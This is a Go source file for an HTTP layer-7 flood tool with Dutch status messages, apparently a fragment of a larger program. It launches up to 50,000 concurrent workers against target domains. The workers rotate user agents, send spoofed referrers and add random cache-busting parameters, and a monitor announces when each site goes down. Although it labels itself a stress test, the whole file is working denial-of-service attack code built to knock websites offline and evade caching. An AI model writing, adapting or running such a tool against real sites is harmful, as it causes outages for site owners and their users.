package main

import (
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"sync"
	"sync/atomic"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
}

func getRandomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

var referrers = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://www.facebook.com/",
	"https://twitter.com/",
	"https://www.linkedin.com/",
	"https://duckduckgo.com/",
}

func getRandomReferrer() string {
	return referrers[rand.Intn(len(referrers))]
}

type domainStats struct {
	domain          string
	targetURL       string
	totalRequests   int64
	successRequests int64
	failedRequests  int64
	siteDown        bool
	siteDownSince   time.Time
	mu              sync.Mutex
	statusLog       []string
}

func applyLevelSettings(o *options) {
	if o.concurrency > 0 {
		return
	}

	if o.level == 0 {
		o.level = 4
	}
	if o.level < 1 {
		o.level = 1
	}
	if o.level > 10 {
		o.level = 10
	}

	switch o.level {
	case 1:
		o.concurrency = 100
	case 2:
		o.concurrency = 500
	case 3:
		o.concurrency = 1500
	case 4:
		o.concurrency = 3000
	case 5:
		o.concurrency = 7000
	case 6:
		o.concurrency = 12000
	case 7:
		o.concurrency = 18000
	case 8:
		o.concurrency = 25000
	case 9:
		o.concurrency = 35000
	case 10:
		o.concurrency = 50000
	}

	fmt.Printf("🎚️  Power Level: %d -> %d Workers\n", o.level, o.concurrency)
}

func runAttack(domains []string, o options) {
	fmt.Printf("⏳ Start L7 Stress Test voor %d minuten op %d doelen...\n", o.attackMinutes, len(domains))

	deadline := time.Now().Add(time.Duration(o.attackMinutes) * time.Minute)
	var allStats []*domainStats

	for _, d := range domains {
		d = normalizeDomain(d)
		targetURL := "https://" + d
		if o.noKeepAlive {
			targetURL = "http://" + d
		}

		s := &domainStats{
			domain:    d,
			targetURL: targetURL,
		}
		allStats = append(allStats, s)

		// Start monitor
		go startHealthMonitor(s, deadline)

		// Start Attackers
		workersPerDomain := o.concurrency / len(domains)
		if workersPerDomain == 0 {
			workersPerDomain = 1
		}

		client := &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				DisableKeepAlives:   o.noKeepAlive,
				MaxIdleConns:        o.concurrency * 2,
				MaxIdleConnsPerHost: o.concurrency * 2,
				IdleConnTimeout:     10 * time.Second,
			},
		}

		for i := 0; i < workersPerDomain; i++ {
			go worker(client, targetURL, s, deadline)
		}
	}

	// Status logger
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	fmt.Println("🚀 Attackers launched. Monitoring status...")
	fmt.Println("--------------------------------------------------")

	for time.Now().Before(deadline) {
		<-ticker.C
		fmt.Printf("\n[%s] Status Update:\n", time.Now().Format(time.TimeOnly))
		for _, s := range allStats {
			s.mu.Lock()
			downStr := "✅ ONLINE"
			if s.siteDown {
				downDuration := time.Since(s.siteDownSince).Round(time.Second)
				downStr = fmt.Sprintf("❌ OFFLINE (Sinds %s)", downDuration)
			}

			fmt.Printf("  %s -> %s\n", s.domain, downStr)
			fmt.Printf("    Reqs: %d (Success: %d, Fail: %d)\n",
				atomic.LoadInt64(&s.totalRequests),
				atomic.LoadInt64(&s.successRequests),
				atomic.LoadInt64(&s.failedRequests))
			s.mu.Unlock()
		}
		fmt.Println("--------------------------------------------------")
	}

	fmt.Println("\n🏁 Aanval voltooid. Tijd verstreken.")
}

func worker(client *http.Client, targetURL string, s *domainStats, deadline time.Time) {
	for time.Now().Before(deadline) {
		// Random Cache-Bypass
		cb := fmt.Sprintf("%d", rand.Int63())
		u, _ := url.Parse(targetURL)
		q := u.Query()
		q.Set("cb", cb)
		u.RawQuery = q.Encode()

		req, _ := http.NewRequest("GET", u.String(), nil)
		req.Header.Set("User-Agent", getRandomUserAgent())
		req.Header.Set("Referer", getRandomReferrer())
		req.Header.Set("Cache-Control", "no-cache")

		atomic.AddInt64(&s.totalRequests, 1)
		resp, err := client.Do(req)
		if err != nil {
			atomic.AddInt64(&s.failedRequests, 1)
		} else {
			// Fast body discard
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()

			if resp.StatusCode >= 500 {
				atomic.AddInt64(&s.failedRequests, 1)
			} else {
				atomic.AddInt64(&s.successRequests, 1)
			}
		}
	}
}

func startHealthMonitor(s *domainStats, deadline time.Time) {
	monitorClient := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			DisableKeepAlives: true,
		},
	}

	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()
	time.Sleep(1 * time.Second)

	for time.Now().Before(deadline) {
		<-ticker.C
		req, _ := http.NewRequest("GET", s.targetURL, nil)
		req.Header.Set("User-Agent", "NetScope-Monitor/1.0")

		resp, err := monitorClient.Do(req)

		s.mu.Lock()
		wasDown := s.siteDown
		s.mu.Unlock()

		if err != nil {
			if !wasDown {
				s.mu.Lock()
				if !s.siteDown {
					s.siteDown = true
					s.siteDownSince = time.Now()
					msg := fmt.Sprintf("[%s] 💥 %s is DOWN!", time.Now().Format(time.TimeOnly), s.domain)
					s.statusLog = append(s.statusLog, msg)
					fmt.Println("\n" + msg)
				}
				s.mu.Unlock()
			}
		} else {
			resp.Body.Close()
			if resp.StatusCode >= 500 {
				if !wasDown {
					s.mu.Lock()
					if !s.siteDown {
						s.siteDown = true
						s.siteDownSince = time.Now()
						msg := fmt.Sprintf("[%s] 💥 %s is throwing 5xx Errors!", time.Now().Format(time.TimeOnly), s.domain)
						s.statusLog = append(s.statusLog, msg)
						fmt.Println("\n" + msg)
					}
					s.mu.Unlock()
				}
			} else {
				if wasDown {
					s.mu.Lock()
					s.siteDown = false
					msg := fmt.Sprintf("[%s] 🔄 %s is RECOVERED!", time.Now().Format(time.TimeOnly), s.domain)
					s.statusLog = append(s.statusLog, msg)
					fmt.Println("\n" + msg)
					s.mu.Unlock()
				}
			}
		}
	}
}
